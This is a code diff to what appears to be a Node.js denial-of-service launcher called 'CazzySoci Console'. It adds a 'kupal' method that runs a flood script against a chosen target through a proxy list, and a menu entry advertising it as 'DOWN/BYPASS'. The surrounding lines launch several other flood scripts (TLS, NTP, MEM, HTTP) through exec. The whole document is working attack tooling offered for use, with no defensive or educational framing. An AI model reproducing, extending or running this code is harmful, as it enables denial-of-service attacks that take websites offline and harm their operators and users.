@@ -362,6 +362,10 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
 	  } else if (methods === 'MEM') {
        pushOngoing(target, methods, duration)
 	exec(`node ${metode} ${target} 80 ${duration}`)
+	  sigma()
+	  } else if (methods === 'kupal') {
+       pushOngoing(target, methods, duration)
+	exec(`node ${metode} ${target} ${duration} 100 3 proxy.txt`)
 	  
 const flood = path.join(__dirname, `/lib/cache/flood.js`);
 const tls = path.join(__dirname, `/lib/cache/tls.js`);
@@ -377,7 +381,7 @@ const flooder = path.join(__dirname, `/lib/cache/flooder.js`);
 const peterda = path.join(__dirname, `/lib/cache/Peterda.js`);
 const ntp = path.join(__dirname, `NTP`);
 const mem = path.join(__dirname, `MEM`);
-const jennesse = path.join(__dirname, `/lib/cache/jennessee.js`);
+const kupal = path.join(__dirname, `/lib/cache/jennessee.js`);
         exec(`node ${flood} ${target} ${duration}`)
         exec(`node ${tls} ${target} ${duration} 100 100`)
         exec(`node ${strike} GET ${target} ${duration} 100 100 proxy.txt`)
@@ -392,7 +396,7 @@ const jennesse = path.join(__dirname, `/lib/cache/jennessee.js`);
 	exec(`node ${peterda} ${target} ${duration} 100 100 proxy.txt`)
         exec(`node ${ntp} ${target} 80 ${duration}`)
         exec(`node ${mem} ${target} 80 ${duration}`)
-	exec(`node ${jennesse} GET ${target} ${duration} 100  --debug`)
+	exec(`node ${kupal} ${target} ${duration} 100 3 proxy.txt`)
 	  
 	  
           sigma()
@@ -703,6 +707,7 @@ permen.question('[\x1b[1m\x1b[32mCazzySoci Console\x1b[0m]: \n', (input) => {
 || peterda    || Flooder with Advanced Features
 || ntp        || Ntp Flood server
 || mem        || Mem Flood server
+|| kupal      || DOWN/BYPASS Ex: https://target.com?q=%RAND%
 [=========================================]
 `);
     sigma();
